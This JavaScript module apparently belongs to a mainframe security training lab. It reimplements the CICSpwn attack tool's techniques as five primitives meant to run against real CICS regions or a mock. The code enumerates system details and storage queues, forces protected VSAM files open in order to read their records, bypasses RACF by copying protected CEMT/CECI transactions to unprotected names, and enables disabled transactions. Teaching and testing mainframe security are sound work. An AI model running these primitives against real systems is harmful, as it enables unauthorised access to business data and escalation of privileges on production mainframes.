'use strict';

/**
 * CICS attack primitives — clean-room reimplementations of the techniques in
 * CICSpwn (Ayoub Elaassal, @Ayoul3, GPL). No CICSpwn code is used or linked;
 * the Python tool is kept only as a conformance oracle for the transcripts.
 *
 * Every primitive drives lib/tn3270.js's adapter, so it runs identically
 * against a real CICS region (GIBSON / an LPAR) and against the in-process mock.
 * Each returns { ok, data, steps[], transcript[] }.
 *   steps      — the exact CEMT/CEDA/CECI strings sent (for the oracle diff)
 *   transcript — adapter.transcript (sent + resulting screen per step)
 */

async function ensureReady(a) {
  if (/CESN|SIGN-ON TO CICS|type your userid/i.test(a.screen())) {
    await a.press('ENTER'); // GIBSON shows its good-morning screen on ENTER
  }
  return a.screen();
}

/** LAB 1 — information gathering (`-i`). Reads the good-morning banner. */
async function infoGather(a) {
  await ensureReady(a);
  const s = a.screen();
  const grab = (re) => { const m = s.match(re); return m ? m[1].trim() : null; };
  const data = {
    zos: grab(/z\/OS\s+([0-9.]+)/i),
    cics: grab(/CICS\s+TS\s+([0-9.]+)/i),
    applid: grab(/APPLID\s+([A-Z0-9]+)/i),
    sysid: grab(/SYSID\s+([A-Z0-9]+)/i),
    lu: grab(/\bLU\s+([A-Z0-9]+)/i),
    hlq: grab(/HLQ[^:]*:\s*([A-Z0-9.*]+)/i),
    users: (s.match(/Active users[^:]*:\s*([A-Z0-9, ]+)/i) || [null, ''])[1].trim(),
    spool: /IRDR|spool/i.test(s) ? 'IRDR / transient queue available' : null,
    esm: grab(/External SecMgr[^:]*:\s*([A-Z0-9/]+)/i)
      || (/\bESM\b|RACF|ACF2|TOP\s?SECRET/i.test(s) ? 'present' : null),
  };
  return { ok: !!(data.cics || data.applid), data, steps: [], transcript: a.transcript.slice() };
}

/** LAB 2 — temporary-storage queue enumeration (`-e`). */
async function enumTSQ(a, opts) {
  const mask = (opts && opts.mask) || '*';
  await ensureReady(a);
  const cmd = `CEMT INQUIRE TSQUEUE(${mask})`;
  a.command(cmd);
  const s = await a.press('ENTER');

  const queues = [];
  const re = /Tsq\(([A-Z0-9 ]+?)\s*\)\s*Ite\((\d+)\)\s*Len\((\d+)\)\s*Tra\(([A-Z0-9 ]+?)\s*\)/g;
  let m;
  while ((m = re.exec(s))) {
    queues.push({ name: m[1].trim(), items: Number(m[2]), length: Number(m[3]), tran: m[4].trim() });
  }
  const blocked = /NOT AUTHORISED|NOT AUTHORIZED|SECURITY/i.test(s);
  return {
    ok: queues.length > 0 && !blocked,
    data: { queues, blocked, hint: blocked ? 'retry with racfBypass first' : null },
    steps: [cmd],
    transcript: a.transcript.slice(),
  };
}

/** LAB 3 — make a VSAM file readable and read it (`--get-file`). */
async function readFile(a, opts) {
  const name = opts && opts.name;
  if (!name) throw new Error('readFile: name required');
  await ensureReady(a);
  const steps = [];

  const inq = `CEMT INQUIRE FILE(${name})`;
  steps.push(inq);
  a.command(inq);
  let s = await a.press('ENTER');

  const readable = new RegExp(`Fil\\(${name}\\s*\\).*Ope.*Ena.*Rea`, 'i').test(s);
  let flipped = false;
  if (!readable) {
    const set = `CEMT SET FILE(${name}) OPEN ENABLE READ`;
    steps.push(set);
    a.command(set);
    s = await a.press('ENTER');
    flipped = /now OPEN ENABLED READ|RESPONSE:\s*NORMAL/i.test(s);
  }

  const browse = `CECI EXEC CICS READ FILE('${name}')`;
  steps.push(browse);
  a.command(browse);
  s = await a.press('ENTER');

  const records = [];
  const rre = /RECORD\s+\d+:\s*(.+?)\s*$/gm;
  let m;
  while ((m = rre.exec(s))) records.push(m[1]);
  const countM = s.match(/\(\s*(\d+)\s+records/i);

  return {
    ok: records.length > 0,
    data: {
      file: name,
      wasReadable: readable,
      flipped,
      state: (flipped || readable) ? 'OPEN ENA READ' : 'unknown',
      recordCount: countM ? Number(countM[1]) : records.length,
      sample: records,
    },
    steps,
    transcript: a.transcript.slice(),
  };
}

/** LAB 4 — RACF bypass: copy protected txns to unprotected names and install. */
async function racfBypass(a, opts) {
  const pairs = (opts && opts.pairs) || [['CEMT', 'CSPS'], ['CECI', 'CSPK']];
  const group = (opts && opts.group) || 'WEBTSEC';
  await ensureReady(a);
  const steps = [];
  const installed = [];

  for (const [from, to] of pairs) {
    const copy = `CEDA COPY TRANSACTION(${from}) TO(${to}) GROUP(${group})`;
    const inst = `CEDA INSTALL TRANSACTION(${to}) GROUP(${group})`;
    steps.push(copy);
    a.command(copy);
    let s = await a.press('ENTER');
    const copied = /COPY SUCCESSFUL|1 ENTRY COPIED/i.test(s);
    steps.push(inst);
    a.command(inst);
    s = await a.press('ENTER');
    const ok = /INSTALL SUCCESSFUL|1 ENTRY INSTALLED/i.test(s);
    if (copied && ok) installed.push({ from, to });
  }

  return {
    ok: installed.length === pairs.length,
    data: {
      installed,
      group,
      note: 'surrogate transactions run without the transaction-level security check',
    },
    steps,
    transcript: a.transcript.slice(),
  };
}

/** LAB 5 — enable disabled transactions. */
async function enableTrans(a, opts) {
  const id = (opts && opts.id) || 'ALL';
  await ensureReady(a);
  const cmd = `CEMT SET TRANSACTION(${id}) ENABLED`;
  a.command(cmd);
  const s = await a.press('ENTER');
  return {
    ok: /ENABLED|RESPONSE:\s*NORMAL/i.test(s),
    data: { id, result: /ENABLED/i.test(s) ? 'enabled' : 'unknown' },
    steps: [cmd],
    transcript: a.transcript.slice(),
  };
}

const PRIMITIVES = {
  infoGather: { fn: infoGather, active: false, label: 'Information gathering (-i)' },
  enumTSQ: { fn: enumTSQ, active: false, label: 'Enumerate TS queues (-e)' },
  readFile: { fn: readFile, active: true, label: 'Read a VSAM file (--get-file)' },
  racfBypass: { fn: racfBypass, active: true, label: 'RACF bypass via CEDA (-e --bypass)' },
  enableTrans: { fn: enableTrans, active: true, label: 'Enable transactions (--enable-tran)' },
};

async function run(name, adapter, opts) {
  const p = PRIMITIVES[name];
  if (!p) throw new Error(`unknown CICS primitive: ${name}`);
  return p.fn(adapter, opts || {});
}

module.exports = {
  infoGather, enumTSQ, readFile, racfBypass, enableTrans,
  PRIMITIVES, run,
};
